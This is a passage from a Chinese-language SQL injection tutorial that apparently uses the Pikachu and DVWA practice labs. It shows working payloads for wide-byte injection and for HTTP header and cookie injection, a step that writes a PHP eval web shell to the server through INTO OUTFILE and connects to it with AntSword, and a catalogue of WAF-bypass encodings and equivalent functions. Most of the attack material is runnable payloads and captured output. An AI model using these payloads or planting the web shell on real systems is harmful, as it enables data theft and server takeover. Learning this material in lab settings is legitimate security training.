<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21069;&#31471;&#36716;&#21040;&#21518;&#31471;&#27491;&#24120;&#26597;&#35810;&#35821;&#21477;</span>
mysql&gt; select id,email from member where username = <span style="color: #8b2252;">'kobe'</span>;
+----+------------------+
| id | email            |
+----+------------------+
|  3 | kobe@pikachu.com |
+----+------------------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21069;&#31471;&#35753;&#24341;&#21495;&#22833;&#25928;&#21518;&#65292;&#26597;&#19981;&#21040;&#20540;</span>
mysql&gt; select id,email from member where username = <span style="color: #8b2252;">'kobe\'</span> or <span style="color: #a0522d;">1</span>=1#<span style="color: #8b2252;">';</span>
<span style="color: #8b2252;">Empty set (0.00 sec)</span>

<span style="color: #8b2252;"># &#36890;&#36807;burp&#25235;&#21253;&#20462;&#25913;&#35831;&#27714;&#20307; kobe%df'</span> or <span style="color: #a0522d;">1</span>=1# 
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#31243;&#24207;&#20570;&#22788;&#29702; kobe%df\' or 1=1#    &#20063;&#23601;&#26159;kobe%df%5c' or 1=1#</span>
mysql&gt; select id,email from member where username = <span style="color: #8b2252;">'kobe&#36939;'</span> or <span style="color: #a0522d;">1</span>=1#<span style="color: #8b2252;">';</span>
<span style="color: #8b2252;">    -&gt; ;</span>
<span style="color: #8b2252;">+----+-------------------+</span>
<span style="color: #8b2252;">| id | email             |</span>
<span style="color: #8b2252;">+----+-------------------+</span>
<span style="color: #8b2252;">|  1 | vince@pikachu.com |</span>
<span style="color: #8b2252;">|  2 | allen@pikachu.com |</span>
<span style="color: #8b2252;">|  3 | kobe@pikachu.com  |</span>
<span style="color: #8b2252;">|  4 | grady@pikachu.com |</span>
<span style="color: #8b2252;">|  5 | kevin@pikachu.com |</span>
<span style="color: #8b2252;">|  6 | lucy@pikachu.com  |</span>
<span style="color: #8b2252;">|  7 | lili@pikachu.com  |</span>
<span style="color: #8b2252;">+----+-------------------+</span>
<span style="color: #8b2252;">7 rows in set (0.00 sec)</span>

<span style="color: #8b2252;">#&#32463;&#36807;&#27979;&#35797;&#21482;&#35201;&#26159;&#33021;&#25340;&#25104;&#23383;&#65292;&#20351;&#29992;&#21333;&#24341;&#21495;&#36867;&#36920;&#23601;&#21487;&#20197;&#27880;&#20837;</span>
<span style="color: #8b2252;">#&#27604;&#22914;&#21069;&#31471;&#36755;&#20837; kobe&#36939;'</span> or <span style="color: #a0522d;">1</span>=1#
<span style="color: #b22222;">#</span><span style="color: #b22222;">burp &#25235;&#21253;</span>
<span style="color: #a0522d;">name</span>=kobe%E9%81%8B%27+or+1%3D1%23&amp;<span style="color: #a0522d;">submit</span>=%E6%9F%A5%E8%AF%A2
<span style="color: #b22222;">#</span><span style="color: #b22222;">%27&#26159;&#21333;&#24341;&#21495;&#65292;&#21518;&#31471;&#20250;&#21152;&#20010;\&#65292;URL&#32534;&#30721;&#20026;%5c&#65292;&#26368;&#32456;&#21487;&#25340;&#20986;2&#23383;&#20351;&#21333;&#24341;&#21495;&#36867;&#36920;</span>

<span style="color: #a0522d;">name</span>=kobe%E9%81%8B%5c%27 or <span style="color: #a0522d;">1</span>=1#<span style="color: #8b2252;">'</span>
<span style="color: #8b2252;">%E9%81 &#38316;</span>
<span style="color: #8b2252;">%8B%5c &#31430; </span>
</pre>
</div>

<p>
未解问题：burp 抓包执行下面语句通过
</p>
<div class="org-src-container">
<pre class="src src-sh">kobe%df%5C%27+or+1+%3D+1%23
</pre>
</div>
</div>
</div>
<div id="outline-container-h:825150d1-c71d-44c3-a210-668fe643a487" class="outline-4">
<h4 id="h:825150d1-c71d-44c3-a210-668fe643a487">http header 和 cookie注入</h4>
<div class="outline-text-4" id="text-h:825150d1-c71d-44c3-a210-668fe643a487">
<p>
HTTP头注入其实并不是一个新的SQL注入类型，而是指出现SQL注入漏洞的场景。有些时候，后台开发人员为了验证客户端头信息（比如常用的cookie验证）, 或者通过http header头信息获取客户端的一些资料，比如useragent、accept字段等，会对客户端的http header信息进行获取并使用SQL进行处理，如果此时没有足够的安全考虑则可能会导致基于http header的SQL注入漏洞。
</p>

<p>
进入pikachu的 http header 来进行一下测试：
</p>
<ul class="org-ul">
<li>SQL-Inject&#x2013;&gt;"http_header"注入</li>
<li>点击右上角提示，给账号密码 admin/123456</li>
<li><p>
登录一次后，我们可以抓包看，修改对应的header user angent 和 cookie
</p>

<pre class="example" id="orga7ff102">
朋友，你好，你的信息已经被记录了：点击退出

你的ip地址:10.0.0.1

你的user agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0

你的http accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

你的端口（本次连接）:tcp15801
</pre></li>
</ul>

<p>
通过登录进去的信息我们可以猜测，这个后端是不是对http header里面的数据进行了获取，应该也进行了相关数据库的操作。我们来看一下刚才的抓包，将它发送到repeater里面，将User-Agent删掉，自己构造一个，还是按照之前的思路，先输入一个单引号：
</p>

<div class="org-src-container">
<pre class="src src-sh">GET /vul/sqli/sqli_header/sqli_header.php HTTP/1.1
Host: 10.0.0.151:8083
User-Agent: 1<span style="color: #8b2252;">'</span>
<span style="color: #8b2252;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span style="color: #8b2252;">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span style="color: #8b2252;">Accept-Encoding: gzip, deflate</span>
<span style="color: #8b2252;">Referer: http://10.0.0.151:8083/vul/sqli/sqli_header/sqli_header_login.php</span>
<span style="color: #8b2252;">Connection: close</span>
<span style="color: #8b2252;">Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=s8tfjhp7uq4offv7j7aspto932; security=low</span>
<span style="color: #8b2252;">Upgrade-Insecure-Requests: 1</span>
<span style="color: #8b2252;">Priority: u=0, i</span>
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">burp&#20013;&#36755;&#20986;&#32467;&#26524;</span>
You have an error<span style="color: #a020f0;"> in</span> your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near <span style="color: #8b2252;">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,<span style="color: #8b2252;">'16483'</span>)<span style="color: #8b2252;">' at line 1</span>
</pre>
</div>

<p>
发现报出了错误，接下来的步骤就很简单了，跟前面的报错注入是一样的。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #8b2252;">' or updatexml(1,concat (0x7e,database()),0) or '</span>
</pre>
</div>

<p>
上面就是固定的测试语法：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #8b2252;">'or xx or'</span>
<span style="color: #8b2252;">'and xx and'</span>
<span style="color: #8b2252;">'and xx or'</span>
</pre>
</div>

<p>
cookie注入就是把注入语句通过抓包放进cookie里面，跟上面的步骤一样，这里不再赘述了。
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#22312;cookie&#20013; amdin' &#26469;&#30830;&#35748;&#26159;&#21542;&#26377;sql&#27880;&#20837;</span>
Cookie: <span style="color: #a0522d;">ant</span>[uname]=admin<span style="color: #8b2252;">'; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=5hmt2o85fg2kqaajflpblim6l2</span>
<span style="color: #8b2252;">Cookie: ant[uname]=admin'</span>or updatexml(1,concat (0x7e,database()),0) or <span style="color: #8b2252;">'; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=s8tfjhp7uq4offv7j7aspto932; security=low</span>

<span style="color: #8b2252;">#&#36755;&#20986;&#32467;&#26524;</span>
<span style="color: #8b2252;">XPATH syntax error: '</span>~pikachu<span style="color: #8b2252;">'</span>
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:e0fba53d-2c1e-4e21-a618-de20545c2b90" class="outline-3">
<h3 id="h:e0fba53d-2c1e-4e21-a618-de20545c2b90">从MySql注入到GetShell</h3>
<div class="outline-text-3" id="text-h:e0fba53d-2c1e-4e21-a618-de20545c2b90">
<p>
Mysql支持向外写文件（这里的“外”是指服务器内部），需要用到mysql select into outfile命令：
</p>

<p>
在mysql数据库中存在mysql select into outfile命令，该命令的作用是将被选择的一行代码写入一个文件中，文件被创建到服务器上。
</p>

<p>
其中，into outfile的使用前提是：
</p>
<ol class="org-ol">
<li>要知道网站的绝对路径，可以通过开源程序、报错信息、phpinfo界面、404界面等一些方式知道</li>
<li>对目录要有写权限，一般image之类的存放图片的目录有写权限</li>
<li>要有mysql file权限（即能否对系统的文件读取和写操作），默认情况下只有root权限有</li>
</ol>

<p>
还要注意：写的文件名一定是在网站中不存在的，不然会失败。
</p>

<p>
我们使用into outfile 写入一句话木马，文件名为shell2.php：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #8b2252;">' union select 1,"&lt;?php eval($_POST['</span>a<span style="color: #8b2252;">']);" into outfile '</span>/var/www/html/shell2.php
</pre>
</div>

<p>
解释
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php eval($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'a'</span>]);
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#24847;&#24605;&#26159;&#25152;&#26377;&#30340;&#36755;&#20837;&#37117;&#25918;&#21040;a&#21464;&#37327;&#20013;&#65292;&#29992;eval&#20989;&#25968;&#26469;&#25191;&#34892;&#12290;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">$_POST   &#20013;_&#19979;&#21010;&#32447;&#21487;&#20197;&#23631;&#34109;&#19968;&#20123;&#25253;&#38169;</span>
</pre>
</div>

<p>
靶场环境：在 DVWA Low 等级的 SQL Injection中输入上面代码
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#21040;&#26381;&#21153;&#22120;&#19978;&#26816;&#26597;&#65292;&#30830;&#23454;&#21019;&#24314;&#20102;&#25991;&#20214;</span>
root@debian:~# docker exec -it dvwa bash
root@62b881738f59:/# ls /var/www/html/shell2.php 
/var/www/html/shell2.php
</pre>
</div>

<p>
可以打开浏览插件hackbar，访问 <a href="http://124.222.171.19:8081/shell2.php">http://124.222.171.19:8081/shell2.php</a> POST方法传递数据 a=system(pwd); 或者a=phpinfo();   可以成功访问，查看目录，果然有了shell2.php文件。
</p>

<p>
用蚁剑链接成功getshell
</p>
<ul class="org-ul">
<li>右键“添加数据”。 填写目标信息后，点击添加。这里是
<ul class="org-ul">
<li>URL地址：<a href="http://10.0.0.151:8080/shell2.php">http://10.0.0.151:8080/shell2.php</a></li>
<li>密码：a</li>
<li>编码：UTF8</li>
<li>连接类型：PHP</li>
</ul></li>
<li>双击已添加的服务器进入，或者右键“虚拟终端”
<ul class="org-ul">
<li>普通用户。可通过提权拿到高权限用户</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-h:b3afa4a1-13a8-44e8-9170-1fc1f153da4d" class="outline-3">
<h3 id="h:b3afa4a1-13a8-44e8-9170-1fc1f153da4d">SQL注入绕过</h3>
<div class="outline-text-3" id="text-h:b3afa4a1-13a8-44e8-9170-1fc1f153da4d">
<p>
这里讲解一下手法，实验操作在进阶时详细讲解。
</p>
</div>
<div id="outline-container-h:9ca7c970-8169-4f68-b428-641474022d33" class="outline-4">
<h4 id="h:9ca7c970-8169-4f68-b428-641474022d33">大小写绕过</h4>
<div class="outline-text-4" id="text-h:9ca7c970-8169-4f68-b428-641474022d33">
<p>
大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法绕过，这是最简单的绕过技术：
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20030;&#20363;&#65306;z.com/index.php?<span style="color: #a0522d;">page_id</span>=-15 uNIoN sELecT 1,2,3,4
</pre>
</div>

<p>
示例场景可能的情况为filter的规则里有对大小写转换的处理，但不是每个关键字或每种情况都有处理。
</p>
</div>
</div>
<div id="outline-container-h:16c175ae-ab76-402c-9895-881b61c0a54c" class="outline-4">
<h4 id="h:16c175ae-ab76-402c-9895-881b61c0a54c">替换关键字</h4>
<div class="outline-text-4" id="text-h:16c175ae-ab76-402c-9895-881b61c0a54c">
<p>
这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过：
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20030;&#20363;&#65306;z.com/index.php?<span style="color: #a0522d;">page_id</span>=-15 UNIunionON SELselectECT 1,2,3,4
</pre>
</div>

<p>
同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT
</p>
</div>
</div>
<div id="outline-container-h:9febda33-298f-4f03-9cdc-47ccb8902976" class="outline-4">
<h4 id="h:9febda33-298f-4f03-9cdc-47ccb8902976">使用编码</h4>
<div class="outline-text-4" id="text-h:9febda33-298f-4f03-9cdc-47ccb8902976">
<p>
1、URL编码
</p>

<p>
在Chrome中输入一个链接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28、右括号%29，普通的URL编码可能无法实现绕过，需要结合实际场景来判断。
</p>

<p>
还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：
</p>

<div class="org-src-container">
<pre class="src src-sh">1%<span style="color: #a0522d;">2527id</span>=1%252f%252a*/UNION%252f%252a%252a/SELECT
</pre>
</div>

<p>
2、十六进制编码
</p>

<div class="org-src-container">
<pre class="src src-sh">mysql&gt; select * from users where <span style="color: #a0522d;">user_id</span>=1 and (extractvalue(1,concat(0x7e,(<span style="color: #a020f0;">select</span> password from users where <span style="color: #a0522d;">first_name</span>=0x61646d696e),0x7e)));
</pre>
</div>

<p>
范例：十六进制编码绕过
</p>
<div class="org-src-container">
<pre class="src src-sh">mysql&gt; select hex(<span style="color: #8b2252;">'admin'</span>);
+--------------+
| hex(<span style="color: #8b2252;">'admin'</span>) |
+--------------+
| 61646D696E   |
+--------------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select first_name,last_name from users where first_name = 0x61646D696E ;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)
</pre>
</div>

<p>
3、Unicode编码
</p>

<p>
形式：“u”或者是“%u”加上4位16进制Unicode码值。
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20551;&#22914;&#23545;select&#20851;&#38190;&#23383;&#36827;&#34892;&#20102;&#36807;&#28388;
&#21487;&#20197;&#23545;&#20854;&#20013;&#20960;&#20010;&#23383;&#27597;&#36827;&#34892;unicode&#32534;&#30721;&#65306;se%u006cect
</pre>
</div>

<p>
看一下常用的几个符号的一些Unicode编码：
</p>
<div class="org-src-container">
<pre class="src src-sh">&#21333;&#24341;&#21495;: %u0027&#12289;%u02b9&#12289;%u02bc&#12289;%u02c8&#12289;%u2032&#12289;%uff07&#12289;%c0%27&#12289;%c0%a7&#12289;%e0%80%a7
&#31354;&#26684;&#65306;%u0020&#12289;%uff00&#12289;%c0%20&#12289;%c0%a0&#12289;%e0%80%a0
&#24038;&#25324;&#21495;&#65306;%u0028&#12289;%uff08&#12289;%c0%28&#12289;%c0%a8&#12289;%e0%80%a8
&#21491;&#25324;&#21495;&#65306;%u0029&#12289;%uff09&#12289;%c0%29&#12289;%c0%a9&#12289;%e0%80%a9
</pre>
</div>
</div>
</div>
<div id="outline-container-h:25e9019e-1401-474c-8f8b-e906ca87fdde" class="outline-4">
<h4 id="h:25e9019e-1401-474c-8f8b-e906ca87fdde">使用注释</h4>
<div class="outline-text-4" id="text-h:25e9019e-1401-474c-8f8b-e906ca87fdde">
<p>
看一下常见的用于注释的符号有哪些：
</p>


<p>
官方参考：<a href="https://dev.mysql.com/doc/refman/8.4/en/comments.html">https://dev.mysql.com/doc/refman/8.4/en/comments.html</a>
</p>

<p>
MySQL 服务器支持三种注释风格：
</p>
<pre class="example" id="orge772943">
#单行注释内容。
-- 注释内容。第二个破折号后至少有一个空白或控制字符，例如空格或制表符
/*注释内容*/ 类似于 C 语言。这种语法允许注释跨越多行
</pre>

<p>
内联注释
</p>
<pre class="example" id="orgc81931e">
/*!MySQL-specific */
只有MySQL能识别它是注释，但不具备注释的语义。
!字符后添加一个版本号，则只有当 MySQL 版本大于或等于指定的版本号时，才执行注释内的语法。
</pre>

<p>
范例
</p>

<div class="org-src-container">
<pre class="src src-sql">mysql&gt; <span style="color: #a020f0;">SELECT</span> 1+1;     #comment 
mysql&gt; <span style="color: #a020f0;">SELECT</span> 1+1;     <span style="color: #b22222;">-- </span><span style="color: #b22222;">comment</span>
mysql&gt; <span style="color: #a020f0;">SELECT</span> 1 <span style="color: #b22222;">/*comment*/</span> + 1;
mysql&gt; <span style="color: #a020f0;">SELECT</span> 1+
<span style="color: #b22222;">/*</span>
<span style="color: #b22222;">this is a</span>
<span style="color: #b22222;">multiple-line comment</span>
<span style="color: #b22222;">*/</span>
1;

<span style="color: #b22222;">/*!select*/</span> 1;
<span style="color: #b22222;">/*!50110 select*/</span> 1;  #MySQL 5.1.10 &#25110;&#26356;&#39640;&#29256;&#26412;
</pre>
</div>


<p>
1、普通注释
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20030;&#20363;&#65306;z.com/index.php?<span style="color: #a0522d;">page_id</span>=-15 %55nION/**/%53ElecT 1,2,3,4

<span style="color: #8b2252;">'union%a0select pass from users#</span>
</pre>
</div>

<p>
/**/在构造的查询语句中插入注释，规避对空格的依赖或关键字识别； <code>#、--</code> 用于终结语句的查询。
</p>

<p>
其中 %a0 是扩展的 ASCII 码（字符码 128-255）:
</p>
<ul class="org-ul">
<li><a href="https://toolhelper.cn/Encoding/ASCII">https://toolhelper.cn/Encoding/ASCII</a></li>
<li><a href="https://en.wikipedia.org/wiki/Non-breaking_space">https://en.wikipedia.org/wiki/Non-breaking_space</a></li>
</ul>

<p>
范例：普通注释
</p>
<div class="org-src-container">
<pre class="src src-sql">mysql&gt; <span style="color: #a020f0;">select</span> first_name,last_name <span style="color: #a020f0;">from</span> users <span style="color: #a020f0;">where</span> user_id= <span style="color: #8b2252;">'1'</span> or1=1;#
ERROR 1064 (42000): You have an error <span style="color: #a020f0;">in</span> your <span style="color: #a020f0;">SQL</span> syntax; <span style="color: #a020f0;">check</span> the manual that corresponds <span style="color: #a020f0;">to</span> your MySQL server version <span style="color: #a020f0;">for</span> the <span style="color: #a020f0;">right</span> syntax <span style="color: #a020f0;">to</span> use near <span style="color: #8b2252;">'or1=1'</span> <span style="color: #a020f0;">at</span> line 1
mysql&gt; <span style="color: #a020f0;">select</span> first_name,last_name <span style="color: #a020f0;">from</span> users <span style="color: #a020f0;">where</span> user_id= <span style="color: #8b2252;">'1'</span> <span style="color: #a020f0;">or</span><span style="color: #b22222;">--</span><span style="color: #b22222;">1=1;#  #--1&#27809;&#26377;&#34987;&#35782;&#21035;&#20026;&#27880;&#37322;&#65292;&#32780;&#26159;&#34987;&#35299;&#37322;&#20026;&#20943;&#36127;1 &#21363;1+1-(-1)</span>
+<span style="color: #b22222;">------------</span><span style="color: #b22222;">+-----------+</span>
| first_name | last_name |
+<span style="color: #b22222;">------------</span><span style="color: #b22222;">+-----------+</span>
| <span style="color: #a020f0;">admin</span>      | <span style="color: #a020f0;">admin</span>     |
| Gordon     | Brown     |
| Hack       | Me        |
| Pablo      | Picasso   |
| Bob        | Smith     |
+<span style="color: #b22222;">------------</span><span style="color: #b22222;">+-----------+</span>
5 <span style="color: #a020f0;">rows</span> <span style="color: #a020f0;">in</span> <span style="color: #a020f0;">set</span> (0.00 sec)

mysql&gt; <span style="color: #a020f0;">select</span> first_name,last_name <span style="color: #a020f0;">from</span> users <span style="color: #a020f0;">where</span> user_id= <span style="color: #8b2252;">'1'</span> <span style="color: #a020f0;">or</span><span style="color: #b22222;">/**/</span>1=1;#
+<span style="color: #b22222;">------------</span><span style="color: #b22222;">+-----------+</span>
| first_name | last_name |
+<span style="color: #b22222;">------------</span><span style="color: #b22222;">+-----------+</span>
| <span style="color: #a020f0;">admin</span>      | <span style="color: #a020f0;">admin</span>     |
| Gordon     | Brown     |
| Hack       | Me        |
| Pablo      | Picasso   |
| Bob        | Smith     |
+<span style="color: #b22222;">------------</span><span style="color: #b22222;">+-----------+</span>
</pre>
</div>

<p>
2、内联注释
</p>

<p>
相比普通注释，内联注释用得更多，它有一个特性 <code>/* ! */</code> 只有MySQL能识别。它是注释，但不具备注释的语义。
</p>


<div class="org-src-container">
<pre class="src src-sh">mysql&gt; select 1+1--<span style="color: #8b2252;">'a'</span>; <span style="color: #b22222;">#</span><span style="color: #b22222;">--'a'&#34987;&#35782;&#21035;&#20026;&#27880;&#37322;&#65292;&#22240;&#20026;--&#21518;&#38754;&#36319;&#30528;&#38750;&#25968;&#23383;&#23383;&#31526;</span>
+----------+
| 1+1--<span style="color: #8b2252;">'a'</span> |
+----------+
|        2 |
+----------+
mysql&gt;  SELECT 1 /**/ + 1--<span style="color: #8b2252;">'s'</span>+<span style="color: #8b2252;">'2'</span>/*!+1*/;
+-----------------------+
| 1 /**/ + 1--<span style="color: #8b2252;">'s'</span>+<span style="color: #8b2252;">'2'</span>+1 |
+-----------------------+
|                     5 |
+-----------------------+
</pre>
</div>

<p>
范例
</p>
<div class="org-src-container">
<pre class="src src-sh">index.php?<span style="color: #a0522d;">page_id</span>=-15 /*!UNION*/ /*!SELECT*/ 1,2,3

mysql&gt; select user_id from users where <span style="color: #a0522d;">user_id</span>=1 /*!union*/ /*!all*/ /*!select*/
2;
mysql&gt; select user_id from users where <span style="color: #a0522d;">user_id</span>=1 /*!union*/ /*!all*/ /*!select*/
1;
mysql&gt; select user_id from users where <span style="color: #a0522d;">user_id</span>=1 /*!union*/ /*all*/ /*!select*/
1;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:f3156e41-2342-4b0a-aa58-e4e067ee5a48" class="outline-4">
<h4 id="h:f3156e41-2342-4b0a-aa58-e4e067ee5a48">等价函数与命令</h4>
<div class="outline-text-4" id="text-h:f3156e41-2342-4b0a-aa58-e4e067ee5a48">
<p>
有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用。
</p>

<p>
<b>1、函数或变量</b>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">bin</span>() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20108;&#36827;&#21046;</span>
<span style="color: #0000ff;">hex</span>() <span style="color: #b22222;"># </span><span style="color: #b22222;">16&#36827;&#21046;</span>
<span style="color: #0000ff;">hex</span>()&#12289;bin() ==&gt; ascii()

<span style="color: #0000ff;">sleep</span>() ==&gt; benchmark()
<span style="color: #0000ff;">BENCHMARK</span>(count,expr)
BENCHMARK&#20250;&#37325;&#22797;&#35745;&#31639;expr&#34920;&#36798;&#24335;count&#27425;&#65292;&#36890;&#36807;&#36825;&#31181;&#26041;&#24335;&#23601;&#21487;&#20197;&#35780;&#20272;&#20986;mysql&#25191;&#34892;&#36825;&#20010;expr&#34920;&#36798;&#24335;&#30340;&#25928;&#29575;&#12290;

<span style="color: #0000ff;">concat_ws</span>()==&gt;group_concat()
<span style="color: #0000ff;">concat_ws</span>(<span style="color: #8b2252;">'&#20998;&#38548;&#31526;'</span>, <span style="color: #8b2252;">'&#23383;&#27573;1'</span>, <span style="color: #8b2252;">'&#23383;&#27573;2'</span>...) &#22810;&#20010;&#21015;&#30340;&#23383;&#27573;&#21512;&#24182;
<span style="color: #0000ff;">group_concat</span>(<span style="color: #8b2252;">'&#23383;&#27573;1'</span>, <span style="color: #8b2252;">'&#23383;&#27573;2'</span>...) &#21516;&#19968;&#21015;&#30340;&#23383;&#27573;&#21512;&#24182;

<span style="color: #0000ff;">mid</span>()&#12289;substr() ==&gt; substring()
<span style="color: #0000ff;">mid</span>() &#20989;&#25968;&#29992;&#20110;&#24471;&#21040;&#19968;&#20010;&#23383;&#31526;&#20018;&#30340;&#19968;&#37096;&#20998;&#12290;SELECT MID(ColumnName, Start, Length)
&#20363;1: mysql&gt; select mid(first_name, 1,1) from users;

&#20363;2: substring()&#21644;substr()&#26080;&#27861;&#20351;&#29992;&#26102;&#65306;
1 and ascii(lower(mid((<span style="color: #a020f0;">select</span> last_name from users limit 1,1),1,1)))=98;
&#25110;&#32773;&#65306;substr((<span style="color: #a020f0;">select</span> <span style="color: #8b2252;">'password'</span>),1,1) = 0x70

<span style="color: #0000ff;">strcmp</span>(str1, str2)&#27604;&#36739;&#20004;&#20010;&#23383;&#31526;&#20018;&#65292;&#22914;&#26524;&#36825;&#20004;&#20010;&#23383;&#31526;&#20018;&#30456;&#31561;&#36820;&#22238;0&#65307;&#22914;&#20309;&#31532;&#20108;&#20010;&#23383;&#31526;&#23567;&#20110;&#31532;&#19968;&#20010;&#23383;&#31526;&#23601;&#36820;&#22238;1&#65292;&#21453;&#20043;&#36820;&#22238;-1&#12290;
<span style="color: #0000ff;">strcmp</span>(left(<span style="color: #8b2252;">'password'</span>,1), 0x69) = 1
<span style="color: #0000ff;">strcmp</span>(left(<span style="color: #8b2252;">'password'</span>,1), 0x70) = 0
<span style="color: #0000ff;">strcmp</span>(left(<span style="color: #8b2252;">'password'</span>,1), 0x71) = -1

<span style="color: #b22222;">#</span><span style="color: #b22222;">left('pw',1) &#36820;&#22238;p&#65292;&#20174;&#24038;&#36793;&#21462;&#19968;&#20010;&#23383;&#31526;</span>
</pre>
</div>
<p>
上述这几个示例用于说明有时候当某个函数不能使用时，还可以找到其他的函数替代其实现。
</p>

<p>
范例：等价函数
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">hex()&#12289;bin() ==&gt; ascii()</span>
mysql&gt; select hex(<span style="color: #8b2252;">'~'</span>);
+----------+
| hex(<span style="color: #8b2252;">'~'</span>) |
+----------+
| 7E       |
+----------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select ascii(<span style="color: #8b2252;">'~'</span>);
+------------+
| ascii(<span style="color: #8b2252;">'~'</span>) |
+------------+
|        126 |
+------------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

<span style="color: #b22222;"># </span><span style="color: #b22222;">sleep() ==&gt; benchmark()</span>
mysql&gt; select first_name,last_name from users where <span style="color: #a0522d;">user_id</span>=<span style="color: #8b2252;">'1'</span> and if(length(database())=4,sleep(2),1);<span style="color: #b22222;">#</span>
Empty set (2.00 sec)
mysql&gt; select first_name,last_name from users where <span style="color: #a0522d;">user_id</span>=<span style="color: #8b2252;">'1'</span> and if(length(database())=4,benchmark(10000000,md5(<span style="color: #8b2252;">'aaa'</span>)),1);<span style="color: #b22222;">#</span>
Empty set (1.97 sec)

<span style="color: #b22222;"># </span><span style="color: #b22222;">concat_ws()==&gt;group_concat()</span>
mysql&gt; select first_name,last_name from users where <span style="color: #a0522d;">user_id</span>=<span style="color: #8b2252;">'1'</span> union select  1,group_concat(<span style="color: #8b2252;">'~'</span>,first_name,last_name) from users;<span style="color: #b22222;">#</span>
+------------+----------------------------------------------------------+
| first_name | last_name                                                |
+------------+----------------------------------------------------------+
| admin      | admin                                                    |
| 1          | ~adminadmin,~GordonBrown,~HackMe,~PabloPicasso,~BobSmith |
+------------+----------------------------------------------------------+
2 rows<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select first_name,last_name from users where <span style="color: #a0522d;">user_id</span>=<span style="color: #8b2252;">'1'</span> union select  1,concat_ws(<span style="color: #8b2252;">'~'</span>,first_name,last_name) from users;<span style="color: #b22222;">#</span>
+------------+---------------+
| first_name | last_name     |
+------------+---------------+
| admin      | admin         |
| 1          | admin~admin   |
| 1          | Gordon~Brown  |
| 1          | Hack~Me       |
| 1          | Pablo~Picasso |
| 1          | Bob~Smith     |
+------------+---------------+
6 rows<span style="color: #a020f0;"> in</span> set (0.00 sec)


<span style="color: #b22222;"># </span><span style="color: #b22222;">mid()&#12289;substr() ==&gt; substring()</span>
mysql&gt; select mid(<span style="color: #8b2252;">'dvwa'</span>,1,1);
+-----------------+
| mid(<span style="color: #8b2252;">'dvwa'</span>,1,1) |
+-----------------+
| d               |
+-----------------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select substring(<span style="color: #8b2252;">'dvwa'</span>,3,1);
+-----------------------+
| substring(<span style="color: #8b2252;">'dvwa'</span>,3,1) |
+-----------------------+
| w                     |
+-----------------------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select first_name,last_name from users where <span style="color: #a0522d;">user_id</span>=<span style="color: #8b2252;">'1'</span> and ascii(substr(database(),1,1))=100;<span style="color: #b22222;">#</span>
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select first_name,last_name from users where <span style="color: #a0522d;">user_id</span>=<span style="color: #8b2252;">'1'</span> and ascii(mid(database(),1,1))=100;<span style="color: #b22222;">#</span>
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select first_name,last_name from users where <span style="color: #a0522d;">user_id</span>=<span style="color: #8b2252;">'1'</span> and ascii(substring(database(),1,1))=100;<span style="color: #b22222;">#</span>
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
